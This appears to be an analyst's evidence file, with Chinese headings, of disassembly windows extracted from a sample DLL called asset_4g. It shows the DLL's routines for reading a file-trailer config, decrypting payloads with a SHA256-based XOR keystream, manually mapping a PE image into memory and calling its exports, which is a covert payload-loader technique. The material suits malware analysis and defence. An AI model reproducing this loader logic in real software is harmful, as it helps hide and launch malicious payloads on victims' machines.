# 流程证据：按引用地址提取的反汇编窗口

由 `extract_flow.py` 从既有 `*.annotated.asm.txt` 文本中提取，仅做文本切片与续行合并；未打开、未映射、未执行任何 DLL。

```asm
; asset_4g ordinal_1 (读尾部配置 -> 调度两个载荷)
; source: asset_4g.dll.annotated.asm.txt  (RVA = VA - 0x180000000)
0x001000  push        rbp
0x001002  lea         rbp,[rsp+FFFFFFFFFFFFFC20h]
0x00100a  sub         rsp,4E0h
0x001011  mov         rax,qword ptr [0000000180021000h]
0x001018  xor         rax,rsp
0x00101b  mov         qword ptr [rbp+00000000000003D0h],rax
0x001022  lea         r8,[rsp+50h]
0x001027  mov         ecx,6
0x00102c  lea         rdx,[0000000180001000h]
0x001033  call        qword ptr [0000000180016048h] ; KERNEL32.dll!GetModuleHandleExW
0x001039  test        eax,eax
0x00103b  jne         0000000180001047
0x00103d  mov         eax,0FFFFFFF6h
0x001042  jmp         0000000180001271
0x001047  mov         rcx,qword ptr [rsp+50h]
0x00104c  lea         rdx,[rbp+00000000000001C0h]
0x001053  mov         r8d,104h
0x001059  call        qword ptr [0000000180016040h] ; KERNEL32.dll!GetModuleFileNameW
0x00105f  test        eax,eax
0x001061  jne         000000018000106D
0x001063  mov         eax,0FFFFFFF5h
0x001068  jmp         0000000180001271
0x00106d  mov         qword ptr [rsp+30h],0
0x001076  lea         rcx,[rbp+00000000000001C0h]
0x00107d  mov         dword ptr [rsp+28h],80h
0x001085  xor         r9d,r9d
0x001088  mov         edx,80000000h
0x00108d  mov         dword ptr [rsp+20h],3
0x001095  mov         r8d,1
0x00109b  mov         qword ptr [rsp+00000000000004F0h],rbx
0x0010a3  call        qword ptr [0000000180016000h] ; KERNEL32.dll!CreateFileW
0x0010a9  mov         rbx,rax
0x0010ac  cmp         rax,0FFFFFFFFFFFFFFFFh
0x0010b0  je          0000000180001264
0x0010b6  lea         rdx,[rsp+48h]
0x0010bb  mov         rcx,rax
0x0010be  call        qword ptr [0000000180016008h] ; KERNEL32.dll!GetFileSizeEx
0x0010c4  test        eax,eax
0x0010c6  je          000000018000125B
0x0010cc  mov         rdx,qword ptr [rsp+48h]
0x0010d1  cmp         rdx,2Ch
0x0010d5  jl          000000018000125B
0x0010db  add         rdx,0FFFFFFFFFFFFFFFCh
0x0010df  xor         r9d,r9d
0x0010e2  xor         r8d,r8d
0x0010e5  mov         rcx,rbx
0x0010e8  call        qword ptr [0000000180016018h] ; KERNEL32.dll!SetFilePointerEx
0x0010ee  test        eax,eax
0x0010f0  je          000000018000125B
0x0010f6  lea         r9,[rsp+44h]
0x0010fb  mov         qword ptr [rsp+20h],0
0x001104  mov         r8d,4
0x00110a  lea         rdx,[rsp+40h]
0x00110f  mov         rcx,rbx
0x001112  call        qword ptr [0000000180016010h] ; KERNEL32.dll!ReadFile
0x001118  test        eax,eax
0x00111a  je          000000018000125B
0x001120  cmp         dword ptr [rsp+44h],4
0x001125  jne         000000018000125B
0x00112b  movzx       eax,byte ptr [rsp+42h]
0x001130  movzx       ecx,byte ptr [rsp+43h]
0x001135  shl         ecx,8
0x001138  or          ecx,eax
0x00113a  movzx       eax,byte ptr [rsp+41h]
0x00113f  shl         ecx,8
0x001142  or          ecx,eax
0x001144  movzx       eax,byte ptr [rsp+40h]
0x001149  shl         ecx,8
0x00114c  or          ecx,eax
0x00114e  cmp         ecx,28h
0x001151  jne         000000018000125B
0x001157  mov         rdx,qword ptr [rsp+48h]
0x00115c  xor         r9d,r9d
0x00115f  add         rdx,0FFFFFFFFFFFFFFD4h
0x001163  xor         r8d,r8d
0x001166  mov         rcx,rbx
0x001169  call        qword ptr [0000000180016018h] ; KERNEL32.dll!SetFilePointerEx
0x00116f  test        eax,eax
0x001171  je          000000018000125B
0x001177  lea         r9,[rsp+44h]
0x00117c  mov         qword ptr [rsp+20h],0
0x001185  mov         r8d,28h
0x00118b  lea         rdx,[rbp-80h]
0x00118f  mov         rcx,rbx
0x001192  call        qword ptr [0000000180016010h] ; KERNEL32.dll!ReadFile
0x001198  test        eax,eax
0x00119a  je          000000018000125B
0x0011a0  cmp         dword ptr [rsp+44h],28h
0x0011a5  jne         000000018000125B
0x0011ab  mov         rcx,rbx
0x0011ae  call        qword ptr [0000000180016020h] ; KERNEL32.dll!CloseHandle
0x0011b4  movups      xmm0,xmmword ptr [rbp-80h]
0x0011b8  mov         r9,0FFFFFFFFFFFFFFFFh
0x0011bf  lea         r8,[rbp+00000000000001C0h]
0x0011c6  movups      xmm1,xmmword ptr [rbp-70h]
0x0011ca  mov         edx,104h
0x0011cf  lea         rcx,[rbp-50h]
0x0011d3  movups      xmmword ptr [rsp+58h],xmm0
0x0011d8  xor         ebx,ebx
0x0011da  movsd       xmm0,mmword ptr [rbp-60h]
0x0011df  movsd       mmword ptr [rsp+78h],xmm0
0x0011e5  movups      xmmword ptr [rsp+68h],xmm1
0x0011ea  call        0000000180005290
0x0011ef  lea         rcx,[rbp-50h]
0x0011f3  call        0000000180007CB0
0x0011f8  test        rax,rax
0x0011fb  je          0000000180001223
0x0011fd  nop         dword ptr [rax]
0x001200  movzx       ecx,word ptr [rbp+rax*2-52h]
0x001205  lea         rdx,[rbp+rax*2-52h]
0x00120a  cmp         cx,5Ch
0x00120e  je          000000018000121E
0x001210  cmp         cx,2Fh
0x001214  je          000000018000121E
0x001216  sub         rax,1
0x00121a  jne         0000000180001200
0x00121c  jmp         0000000180001223
0x00121e  xor         eax,eax
0x001220  mov         word ptr [rdx],ax
0x001223  cmp         byte ptr [rsp+60h],bl
0x001227  je          0000000180001239
0x001229  lea         rdx,[rsp+60h]
0x00122e  lea         rcx,[rbp-50h]
0x001232  call        0000000180001320
0x001237  mov         ebx,eax
0x001239  cmp         byte ptr [rsp+70h],0
0x00123e  je          0000000180001257
0x001240  lea         rdx,[rsp+70h]
0x001245  lea         rcx,[rbp-50h]
0x001249  call        0000000180001320
0x00124e  test        eax,eax
0x001250  je          0000000180001257
0x001252  test        ebx,ebx
0x001254  cmove       ebx,eax
0x001257  mov         eax,ebx
0x001259  jmp         0000000180001269
0x00125b  mov         rcx,rbx
0x00125e  call        qword ptr [0000000180016020h] ; KERNEL32.dll!CloseHandle
```

```asm
; asset_4g process_payload (解密 -> 映射 -> 调用序号1)
; source: asset_4g.dll.annotated.asm.txt  (RVA = VA - 0x180000000)
0x001320  sub         rsp,278h
0x001327  mov         rax,qword ptr [0000000180021000h]
0x00132e  xor         rax,rsp
0x001331  mov         qword ptr [rsp+0000000000000260h],rax
0x001339  test        rcx,rcx
0x00133c  je          00000001800014EB
0x001342  test        rdx,rdx
0x001345  je          00000001800014EB
0x00134b  cmp         byte ptr [rdx],0
0x00134e  je          00000001800014EB
0x001354  mov         qword ptr [rsp+28h],rdx
0x001359  lea         r9,[0000000180016370h] ; '%s\\%hs'
0x001360  mov         qword ptr [rsp+20h],rcx
0x001365  mov         edx,104h
0x00136a  lea         rcx,[rsp+50h]
0x00136f  mov         r8,0FFFFFFFFFFFFFFFFh
0x001376  call        00000001800012B0
0x00137b  test        eax,eax
0x00137d  jns         000000018000139C
0x00137f  mov         eax,0FFFFFFFFh
0x001384  mov         rcx,qword ptr [rsp+0000000000000260h]
0x00138c  xor         rcx,rsp
0x00138f  call        00000001800022D0
0x001394  add         rsp,278h
0x00139b  ret
0x00139c  lea         r8,[rsp+30h]
0x0013a1  lea         rdx,[rsp+38h]
0x0013a6  lea         rcx,[rsp+50h]
0x0013ab  call        0000000180001CF0
0x0013b0  test        eax,eax
0x0013b2  jne         00000001800013D1
0x0013b4  mov         eax,0FFFFFFFEh
0x0013b9  mov         rcx,qword ptr [rsp+0000000000000260h]
0x0013c1  xor         rcx,rsp
0x0013c4  call        00000001800022D0
0x0013c9  add         rsp,278h
0x0013d0  ret
0x0013d1  mov         rdx,qword ptr [rsp+30h]
0x0013d6  lea         r8,[rsp+40h]
0x0013db  mov         qword ptr [rsp+0000000000000290h],rbx
0x0013e3  mov         rbx,qword ptr [rsp+38h]
0x0013e8  mov         rcx,rbx
0x0013eb  call        00000001800017E0
0x0013f0  mov         rcx,rbx
0x0013f3  test        eax,eax
0x0013f5  jne         0000000180001421
0x0013f7  call        0000000180007C90
0x0013fc  mov         eax,0FFFFFFFDh
0x001401  mov         rbx,qword ptr [rsp+0000000000000290h]
0x001409  mov         rcx,qword ptr [rsp+0000000000000260h]
0x001411  xor         rcx,rsp
0x001414  call        00000001800022D0
0x001419  add         rsp,278h
0x001420  ret
0x001421  call        0000000180007C90
0x001426  mov         rbx,qword ptr [rsp+40h]
0x00142b  movsxd      rax,dword ptr [rbx+3Ch]
0x00142f  mov         ecx,dword ptr [rax+rbx+0000000000000088h]
0x001436  test        ecx,ecx
0x001438  je          00000001800014B1
0x00143a  mov         edx,dword ptr [rcx+rbx+10h]
0x00143e  cmp         edx,1
0x001441  ja          00000001800014B1
0x001443  mov         eax,1
0x001448  sub         eax,edx
0x00144a  cmp         eax,dword ptr [rcx+rbx+14h]
0x00144e  jae         00000001800014B1
0x001450  mov         ecx,dword ptr [rcx+rbx+1Ch]
0x001454  add         rcx,rbx
0x001457  mov         eax,dword ptr [rcx+rax*4]
0x00145a  test        eax,eax
0x00145c  je          00000001800014B1
0x00145e  mov         ecx,eax
0x001460  add         rcx,rbx
0x001463  je          00000001800014B1
0x001465  mov         qword ptr [rsp+0000000000000270h],rdi
0x00146d  call        rcx
0x00146f  mov         edi,eax
0x001471  test        rbx,rbx
0x001474  je          00000001800014A2
0x001476  movsxd      rcx,dword ptr [rbx+3Ch]
0x00147a  mov         edx,dword ptr [rcx+rbx+28h]
0x00147e  test        edx,edx
0x001480  je          0000000180001491
0x001482  lea         r9,[rbx+rdx]
0x001486  xor         r8d,r8d
0x001489  xor         edx,edx
0x00148b  mov         rcx,rbx
0x00148e  call        r9
0x001491  xor         edx,edx
0x001493  mov         r8d,8000h
0x001499  mov         rcx,rbx
0x00149c  call        qword ptr [0000000180016038h] ; KERNEL32.dll!VirtualFree
```

```asm
; asset_4g decode_payload (参数搬运/异或/流生成调用)
; source: asset_4g.dll.annotated.asm.txt  (RVA = VA - 0x180000000)
0x001cf0  push        rbp
0x001cf2  push        rsi
0x001cf3  push        rdi
0x001cf4  push        r13
0x001cf6  lea         rbp,[rsp-8]
0x001cfb  sub         rsp,108h
0x001d02  mov         rax,r8
0x001d05  mov         r13,rdx
0x001d08  mov         qword ptr [rsp+50h],rax
0x001d0d  test        rcx,rcx
0x001d10  je          0000000180002078
0x001d16  test        rdx,rdx
0x001d19  je          0000000180002078
0x001d1f  test        rax,rax
0x001d22  je          0000000180002078
0x001d28  xor         esi,esi
0x001d2a  xor         r9d,r9d
0x001d2d  mov         qword ptr [rdx],rsi
0x001d30  mov         edx,80000000h
0x001d35  mov         qword ptr [r8],rsi
0x001d38  mov         r8d,1
0x001d3e  mov         qword ptr [rsp+30h],rsi
0x001d43  mov         dword ptr [rsp+28h],80h
0x001d4b  mov         dword ptr [rsp+20h],3
0x001d53  call        qword ptr [0000000180016000h] ; KERNEL32.dll!CreateFileW
0x001d59  mov         rdi,rax
0x001d5c  cmp         rax,0FFFFFFFFFFFFFFFFh
0x001d60  je          0000000180002078
0x001d66  lea         rdx,[rsp+48h]
0x001d6b  mov         qword ptr [rsp+0000000000000148h],rbx
0x001d73  mov         rcx,rax
0x001d76  call        qword ptr [0000000180016008h] ; KERNEL32.dll!GetFileSizeEx
0x001d7c  test        eax,eax
0x001d7e  je          000000018000206D
0x001d84  mov         rcx,qword ptr [rsp+48h]
0x001d89  lea         rax,[rcx-1]
0x001d8d  cmp         rax,3FFFFFFh
0x001d93  ja          000000018000206D
0x001d99  call        0000000180007CA0
0x001d9e  mov         rbx,rax
0x001da1  test        rax,rax
0x001da4  je          000000018000206D
0x001daa  mov         r8d,dword ptr [rsp+48h]
0x001daf  lea         r9,[rsp+44h]
0x001db4  mov         rdx,rax
0x001db7  mov         qword ptr [rsp+20h],rsi
0x001dbc  mov         rcx,rdi
0x001dbf  call        qword ptr [0000000180016010h] ; KERNEL32.dll!ReadFile
0x001dc5  test        eax,eax
0x001dc7  je          0000000180002045
0x001dcd  mov         eax,dword ptr [rsp+48h]
0x001dd1  cmp         dword ptr [rsp+44h],eax
0x001dd5  jne         0000000180002045
0x001ddb  mov         rcx,rdi
0x001dde  call        qword ptr [0000000180016020h] ; KERNEL32.dll!CloseHandle
0x001de4  mov         edi,dword ptr [rsp+44h]
0x001de8  cmp         rdi,6Ch
0x001dec  jb          000000018000204E
0x001df2  movzx       eax,byte ptr [rdi+rbx-2]
0x001df7  movzx       ecx,byte ptr [rdi+rbx-1]
0x001dfc  shl         ecx,8
0x001dff  or          ecx,eax
0x001e01  movzx       eax,byte ptr [rdi+rbx-3]
0x001e06  shl         ecx,8
0x001e09  or          ecx,eax
0x001e0b  movzx       eax,byte ptr [rdi+rbx-4]
0x001e10  shl         ecx,8
0x001e13  or          ecx,eax
0x001e15  cmp         ecx,68h
0x001e18  jne         000000018000204E
0x001e1e  movups      xmm0,xmmword ptr [rdi+rbx-6Ch]
0x001e23  mov         qword ptr [rsp+00000000000000F0h],r15
0x001e2b  movups      xmm1,xmmword ptr [rdi+rbx-5Ch]
0x001e30  mov         qword ptr [rsp+0000000000000100h],r12
0x001e38  movups      xmm3,xmmword ptr [rdi+rbx-1Ch]
0x001e3d  mov         qword ptr [rsp+00000000000000F8h],r14
0x001e45  movups      xmmword ptr [rsp+60h],xmm0
0x001e4a  movups      xmm0,xmmword ptr [rdi+rbx-4Ch]
0x001e4f  movups      xmmword ptr [rsp+70h],xmm1
0x001e54  movups      xmm1,xmmword ptr [rdi+rbx-3Ch]
0x001e59  movups      xmmword ptr [rbp-80h],xmm0
0x001e5d  movups      xmm0,xmmword ptr [rdi+rbx-2Ch]
0x001e62  movups      xmmword ptr [rbp-70h],xmm1
0x001e66  movdqu      xmm1,xmmword ptr [rsp+68h]
0x001e6c  movups      xmmword ptr [rbp-60h],xmm0
0x001e70  movsd       xmm0,mmword ptr [rdi+rbx-0Ch]
0x001e76  add         rdi,0FFFFFFFFFFFFFF94h
0x001e7a  movdqu      xmm2,xmmword ptr [rbp-68h]
0x001e7f  movsd       mmword ptr [rbp-40h],xmm0
0x001e84  movdqu      xmm0,xmmword ptr [rbp-78h]
0x001e89  movups      xmmword ptr [rbp-50h],xmm3
0x001e8d  xorps       xmm1,xmm0
0x001e90  movdqu      xmm0,xmmword ptr [rsp+78h]
0x001e96  movdqu      xmmword ptr [rbp-30h],xmm1
0x001e9b  xorps       xmm2,xmm0
0x001e9e  movdqa      xmm0,xmm3
0x001ea2  psrldq      xmm0,0Ch
0x001ea7  movd        r15d,xmm0
0x001eac  movdqu      xmmword ptr [rbp-20h],xmm2
0x001eb1  test        r15d,r15d
0x001eb4  je          0000000180001F5B
0x001eba  psrldq      xmm3,8
0x001ebf  lea         r9,[rsp+40h]
0x001ec4  movd        r8d,xmm3
0x001ec9  mov         rdx,rdi
0x001ecc  mov         rcx,rbx
0x001ecf  call        0000000180001B30
0x001ed4  test        eax,eax
0x001ed6  je          0000000180001F5B
0x001edc  mov         eax,dword ptr [rsp+40h]
0x001ee0  mov         r12d,eax
0x001ee3  cmp         rax,rdi
0x001ee6  jae         0000000180001F5B
0x001ee8  test        r15d,r15d
0x001eeb  je          0000000180001F5B
0x001eed  lea         ecx,[r15+rax]
0x001ef1  cmp         rcx,rdi
0x001ef4  ja          0000000180001F5B
0x001ef6  mov         ecx,r15d
0x001ef9  mov         r14d,r15d
0x001efc  call        0000000180007CA0
0x001f01  mov         rsi,rax
0x001f04  test        rax,rax
0x001f07  je          0000000180001F5B
0x001f09  mov         qword ptr [rsp+28h],0
0x001f12  lea         r8,[rbp-58h]
0x001f16  mov         r9,rax
0x001f19  mov         qword ptr [rsp+20h],r14
0x001f1e  lea         rdx,[rbp-78h]
0x001f22  lea         rcx,[rbp-30h]
0x001f26  call        0000000180001510
0x001f2b  xor         ecx,ecx
0x001f2d  test        r15d,r15d
0x001f30  je          0000000180001F4F
0x001f32  lea         rdx,[rbx+r12]
0x001f36  nop         word ptr [rax+rax+0000000000000000h]
0x001f40  movzx       eax,byte ptr [rsi+rcx]
0x001f44  xor         byte ptr [rdx+rcx],al
0x001f47  inc         rcx
0x001f4a  cmp         rcx,r14
0x001f4d  jb          0000000180001F40
0x001f4f  mov         rcx,rsi
0x001f52  call        0000000180007C90
0x001f57  mov         r15d,dword ptr [rbp-44h]
0x001f5b  mov         esi,dword ptr [rbp-3Ch]
0x001f5e  test        esi,esi
0x001f60  je          0000000180001FF7
0x001f66  mov         r8d,dword ptr [rbp-40h]
0x001f6a  lea         r9,[rsp+40h]
0x001f6f  mov         rdx,rdi
0x001f72  mov         rcx,rbx
0x001f75  call        0000000180001B30
0x001f7a  test        eax,eax
0x001f7c  je          0000000180001FF7
0x001f7e  mov         eax,dword ptr [rsp+40h]
0x001f82  mov         r12d,eax
0x001f85  cmp         rax,rdi
0x001f88  jae         0000000180001FF7
0x001f8a  test        esi,esi
0x001f8c  je          0000000180001FF7
0x001f8e  lea         ecx,[rsi+rax]
0x001f91  cmp         rcx,rdi
0x001f94  ja          0000000180001FF7
0x001f96  mov         ecx,esi
0x001f98  mov         r14d,esi
0x001f9b  call        0000000180007CA0
0x001fa0  mov         rsi,rax
0x001fa3  test        rax,rax
0x001fa6  je          0000000180001FF7
0x001fa8  mov         eax,r15d
0x001fab  lea         r8,[rbp-58h]
0x001faf  mov         qword ptr [rsp+28h],rax
0x001fb4  lea         rdx,[rbp-78h]
0x001fb8  mov         r9,rsi
0x001fbb  mov         qword ptr [rsp+20h],r14
0x001fc0  lea         rcx,[rbp-30h]
0x001fc4  call        0000000180001510
0x001fc9  xor         ecx,ecx
0x001fcb  test        r14,r14
0x001fce  je          0000000180001FEF
0x001fd0  lea         rdx,[rbx+r12]
0x001fd4  nop         dword ptr [rax]
0x001fd8  nop         dword ptr [rax+rax+0000000000000000h]
```

```asm
; asset_4g 密钥流生成器 (80字节 seed -> SHA256 -> 计数器哈希)
; source: asset_4g.dll.annotated.asm.txt  (RVA = VA - 0x180000000)
0x001510  test        r9,r9
0x001513  je          00000001800017DC
0x001519  push        rbp
0x00151a  push        r13
0x00151c  lea         rbp,[rsp-68h]
0x001521  sub         rsp,168h
0x001528  mov         rax,qword ptr [0000000180021000h]
0x00152f  xor         rax,rsp
0x001532  mov         qword ptr [rbp+20h],rax
0x001536  mov         qword ptr [rsp+0000000000000148h],r12
0x00153e  mov         r13,r9
0x001541  mov         r12,qword ptr [rbp+00000000000000A0h]
0x001548  test        r12,r12
0x00154b  je          00000001800017BE
0x001551  movups      xmm0,xmmword ptr [rcx]
0x001554  movups      xmm1,xmmword ptr [rcx+10h]
0x001558  lea         rcx,[rbp-50h]
0x00155c  movaps      xmmword ptr [rbp-50h],xmm0
0x001560  movups      xmm0,xmmword ptr [rdx]
0x001563  movaps      xmmword ptr [rbp-40h],xmm1
0x001567  movups      xmm1,xmmword ptr [rdx+10h]
0x00156b  mov         edx,50h
0x001570  movaps      xmmword ptr [rbp-30h],xmm0
0x001574  movups      xmm0,xmmword ptr [r8]
0x001578  lea         r8,[rbp-78h]
0x00157c  movaps      xmmword ptr [rbp-20h],xmm1
0x001580  movaps      xmmword ptr [rbp-10h],xmm0
0x001584  call        0000000180002090
0x001589  test        eax,eax
0x00158b  je          00000001800017BE
0x001591  mov         qword ptr [rsp+0000000000000158h],rsi
0x001599  xor         ecx,ecx
0x00159b  mov         qword ptr [rsp+0000000000000150h],rdi
0x0015a3  mov         esi,ecx
0x0015a5  mov         qword ptr [rsp+0000000000000140h],r14
0x0015ad  mov         edi,ecx
0x0015af  mov         r14,qword ptr [rbp+00000000000000A8h]
0x0015b6  mov         qword ptr [rsp+0000000000000138h],r15
0x0015be  lea         r15,[r12+r14]
0x0015c2  test        r15,r15
0x0015c5  je          000000018000179E
0x0015cb  mov         qword ptr [rsp+0000000000000160h],rbx
0x0015d3  nop         dword ptr [rax]
0x0015d7  nop         word ptr [rax+rax+0000000000000000h]
0x0015e0  movups      xmm0,xmmword ptr [rbp-78h]
0x0015e4  mov         eax,edi
0x0015e6  mov         qword ptr [rsp+50h],rcx
0x0015eb  movups      xmm1,xmmword ptr [rbp-68h]
0x0015ef  shr         eax,8
0x0015f2  lea         rdx,[0000000180016340h] ; 'SHA256'
0x0015f9  mov         byte ptr [rbp-7Fh],al
0x0015fc  mov         rbx,rcx
0x0015ff  mov         eax,edi
0x001601  mov         qword ptr [rsp+48h],rcx
0x001606  shr         eax,10h
0x001609  xor         r9d,r9d
0x00160c  mov         byte ptr [rbp-7Eh],al
0x00160f  xor         r8d,r8d
0x001612  mov         eax,edi
0x001614  mov         dword ptr [rsp+40h],ecx
0x001618  shr         eax,18h
0x00161b  mov         dword ptr [rsp+58h],ecx
0x00161f  lea         rcx,[rsp+50h]
0x001624  mov         byte ptr [rbp-7Dh],al
0x001627  movups      xmmword ptr [rsp+60h],xmm0
0x00162c  mov         byte ptr [rbp-80h],dil
0x001630  movups      xmmword ptr [rsp+70h],xmm1
0x001635  call        0000000180002210
0x00163a  test        eax,eax
0x00163c  js          000000018000176E
0x001642  mov         rcx,qword ptr [rsp+50h]
0x001647  lea         rax,[rsp+58h]
0x00164c  mov         dword ptr [rsp+28h],0
0x001654  lea         r8,[rsp+40h]
0x001659  mov         r9d,4
0x00165f  mov         qword ptr [rsp+20h],rax
0x001664  lea         rdx,[0000000180016350h] ; 'ObjectLength'
0x00166b  call        0000000180002216
0x001670  test        eax,eax
0x001672  js          000000018000176E
0x001678  mov         ecx,dword ptr [rsp+40h]
0x00167c  call        0000000180007CA0
0x001681  mov         rbx,rax
0x001684  test        rax,rax
0x001687  je          000000018000176E
0x00168d  mov         r9d,dword ptr [rsp+40h]
0x001692  lea         rdx,[rsp+48h]
0x001697  mov         rcx,qword ptr [rsp+50h]
0x00169c  xor         eax,eax
0x00169e  mov         dword ptr [rsp+30h],eax
0x0016a2  mov         r8,rbx
0x0016a5  mov         dword ptr [rsp+28h],eax
0x0016a9  mov         qword ptr [rsp+20h],rax
0x0016ae  call        0000000180002222
0x0016b3  test        eax,eax
0x0016b5  js          000000018000176E
0x0016bb  mov         rcx,qword ptr [rsp+48h]
0x0016c0  lea         rdx,[rsp+60h]
0x0016c5  xor         r9d,r9d
0x0016c8  mov         r8d,24h
0x0016ce  call        0000000180002228
0x0016d3  test        eax,eax
0x0016d5  js          000000018000176E
0x0016db  mov         rcx,qword ptr [rsp+48h]
0x0016e0  lea         rdx,[rbp]
0x0016e4  xor         r9d,r9d
0x0016e7  mov         r8d,20h
0x0016ed  call        000000018000222E
0x0016f2  test        eax,eax
0x0016f4  js          000000018000176E
0x0016f6  mov         rcx,qword ptr [rsp+48h]
0x0016fb  call        0000000180002234
0x001700  mov         rcx,qword ptr [rsp+50h]
0x001705  xor         edx,edx
0x001707  call        000000018000221C
0x00170c  mov         rcx,rbx
0x00170f  call        0000000180007C90
0x001714  lea         rbx,[rsi+20h]
0x001718  cmp         rbx,r14
0x00171b  jbe         000000018000175D
0x00171d  xor         eax,eax
0x00171f  mov         r9,r14
0x001722  sub         r9,rsi
0x001725  mov         edx,20h
0x00172a  cmp         rsi,r14
0x00172d  mov         r8,r12
0x001730  cmovae      r9,rax
0x001734  sub         rdx,r9
0x001737  mov         rcx,r9
0x00173a  sub         rcx,r14
0x00173d  add         rcx,rsi
0x001740  sub         r8,rcx
0x001743  lea         rax,[rcx+rdx]
0x001747  cmp         rax,r12
0x00174a  cmovbe      r8,rdx
0x00174e  lea         rdx,[rbp]
0x001752  add         rdx,r9
0x001755  add         rcx,r13
0x001758  call        0000000180014530
0x00175d  mov         rsi,rbx
0x001760  cmp         rbx,r15
0x001763  jae         0000000180001796
0x001765  inc         edi
0x001767  xor         ecx,ecx
0x001769  jmp         00000001800015E0
0x00176e  mov         rcx,qword ptr [rsp+48h]
0x001773  test        rcx,rcx
0x001776  je          000000018000177D
0x001778  call        0000000180002234
0x00177d  mov         rcx,qword ptr [rsp+50h]
0x001782  test        rcx,rcx
0x001785  je          000000018000178E
0x001787  xor         edx,edx
0x001789  call        000000018000221C
0x00178e  mov         rcx,rbx
0x001791  call        0000000180007C90
0x001796  mov         rbx,qword ptr [rsp+0000000000000160h]
0x00179e  mov         r14,qword ptr [rsp+0000000000000140h]
0x0017a6  mov         rdi,qword ptr [rsp+0000000000000150h]
0x0017ae  mov         rsi,qword ptr [rsp+0000000000000158h]
0x0017b6  mov         r15,qword ptr [rsp+0000000000000138h]
0x0017be  mov         r12,qword ptr [rsp+0000000000000148h]
0x0017c6  mov         rcx,qword ptr [rbp+20h]
0x0017ca  xor         rcx,rsp
0x0017cd  call        00000001800022D0
0x0017d2  add         rsp,168h
0x0017d9  pop         r13
0x0017db  pop         rbp
0x0017dc  ret
0x0017dd  int         3
0x0017de  int         3
0x0017df  int         3
```

```asm
; asset_4g manually_map_PE (分配/复制/重定位/导入解析/入口调用)
; source: asset_4g.dll.annotated.asm.txt  (RVA = VA - 0x180000000)
0x0017e0  push        rbx
0x0017e2  push        rbp
0x0017e3  push        rsi
0x0017e4  push        r12
0x0017e6  push        r14
0x0017e8  push        r15
0x0017ea  sub         rsp,28h
0x0017ee  mov         r12,r8
0x0017f1  mov         r14,rdx
0x0017f4  mov         rsi,rcx
0x0017f7  test        rcx,rcx
0x0017fa  je          0000000180001B1E
0x001800  test        rdx,rdx
0x001803  je          0000000180001B1E
0x001809  test        r8,r8
0x00180c  je          0000000180001B1E
0x001812  xorps       xmm0,xmm0
0x001815  movups      xmmword ptr [r8],xmm0
0x001819  cmp         rdx,40h
0x00181d  jb          0000000180001B1E
0x001823  mov         eax,5A4Dh
0x001828  cmp         word ptr [rcx],ax
0x00182b  jne         0000000180001B1E
0x001831  movsxd      rbx,dword ptr [rcx+3Ch]
0x001835  lea         rax,[rbx+0000000000000108h]
0x00183c  cmp         rax,rdx
0x00183f  ja          0000000180001B1E
0x001845  cmp         dword ptr [rbx+rcx],4550h
0x00184c  jne         0000000180001B1E
0x001852  mov         eax,20Bh
0x001857  cmp         word ptr [rbx+rcx+18h],ax
0x00185c  jne         0000000180001B1E
0x001862  mov         r15d,dword ptr [rbx+rcx+50h]
0x001867  mov         r9d,4
0x00186d  mov         edx,r15d
0x001870  mov         r8d,3000h
0x001876  xor         ecx,ecx
0x001878  call        qword ptr [0000000180016028h] ; KERNEL32.dll!VirtualAlloc
0x00187e  mov         rbp,rax
0x001881  test        rax,rax
0x001884  je          0000000180001B1E
0x00188a  mov         r8d,dword ptr [rbx+rsi+54h]
0x00188f  mov         qword ptr [rsp+68h],rdi
0x001894  mov         qword ptr [rsp+20h],r13
0x001899  cmp         r8,r14
0x00189c  ja          0000000180001B09
0x0018a2  cmp         r8d,r15d
0x0018a5  ja          0000000180001B09
0x0018ab  mov         rdx,rsi
0x0018ae  mov         rcx,rax
0x0018b1  call        0000000180014530
0x0018b6  movsxd      r13,dword ptr [rsi+3Ch]
0x0018ba  xor         ebx,ebx
0x0018bc  add         r13,rbp
0x0018bf  xor         eax,eax
0x0018c1  movzx       edi,word ptr [r13+14h]
0x0018c6  add         rdi,r13
0x0018c9  cmp         ax,word ptr [r13+6]
0x0018ce  jae         0000000180001921
0x0018d0  lea         rcx,[rbx+rbx*4]
0x0018d4  mov         edx,dword ptr [rdi+rcx*8+28h]
0x0018d8  lea         r8,[rcx*8+0000000000000000h]
0x0018e0  test        edx,edx
0x0018e2  je          0000000180001916
0x0018e4  mov         r9d,dword ptr [rdi+r8+2Ch]
0x0018e9  lea         ecx,[r9+rdx]
0x0018ed  cmp         rcx,r14
0x0018f0  ja          0000000180001B09
0x0018f6  mov         ecx,dword ptr [rdi+r8+24h]
0x0018fb  lea         eax,[rcx+rdx]
0x0018fe  cmp         eax,r15d
0x001901  ja          0000000180001B09
0x001907  mov         r8d,edx
0x00190a  add         rcx,rbp
0x00190d  lea         rdx,[rsi+r9]
0x001911  call        0000000180014530
0x001916  movzx       eax,word ptr [r13+6]
0x00191b  inc         ebx
0x00191d  cmp         ebx,eax
0x00191f  jb          00000001800018D0
0x001921  mov         r10,rbp
0x001924  sub         r10,qword ptr [r13+30h]
0x001928  je          00000001800019B8
0x00192e  mov         eax,dword ptr [r13+00000000000000B0h]
0x001935  test        eax,eax
0x001937  je          00000001800019B8
0x00193d  mov         ecx,dword ptr [r13+00000000000000B4h]
0x001944  test        ecx,ecx
0x001946  je          00000001800019B8
0x001948  lea         r8,[rax+rbp]
0x00194c  lea         rbx,[r8+rcx]
0x001950  cmp         r8,rbx
0x001953  jae         00000001800019B8
0x001955  mov         eax,dword ptr [r8+4]
0x001959  cmp         eax,8
0x00195c  jb          00000001800019B8
0x00195e  mov         r9d,dword ptr [r8]
0x001961  lea         r11,[rax-8]
0x001965  add         r9,rbp
0x001968  mov         edx,0
0x00196d  shr         r11,1
0x001970  je          00000001800019AC
0x001972  nop         dword ptr [rax]
0x001976  nop         word ptr [rax+rax+0000000000000000h]
0x001980  movzx       eax,word ptr [r8+rdx*2+8]
0x001986  mov         ecx,eax
0x001988  and         eax,0FFFh
0x00198d  shr         ecx,0Ch
0x001990  cmp         ecx,0Ah
0x001993  jne         000000018000199B
0x001995  add         qword ptr [rax+r9],r10
0x001999  jmp         00000001800019A4
0x00199b  cmp         ecx,3
0x00199e  jne         00000001800019A4
0x0019a0  add         dword ptr [rax+r9],r10d
0x0019a4  inc         rdx
0x0019a7  cmp         rdx,r11
0x0019aa  jb          0000000180001980
0x0019ac  mov         eax,dword ptr [r8+4]
0x0019b0  add         r8,rax
0x0019b3  cmp         r8,rbx
0x0019b6  jb          0000000180001955
0x0019b8  mov         eax,dword ptr [r13+0000000000000090h]
